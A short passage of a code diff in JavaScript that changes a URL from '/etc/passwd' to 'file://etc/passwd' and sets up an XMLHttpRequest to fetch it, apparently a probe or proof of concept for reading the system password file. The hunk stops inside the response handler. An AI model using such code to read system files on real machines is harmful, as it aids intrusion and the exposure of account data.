@@ -1,4 +1,4 @@
-const url = "/etc/passwd";
+const url = "file://etc/passwd";
 let xml = new XMLHttpRequest();
 xml.onreadystatechange = function(){
     if(xml.readyState !== 4) return;
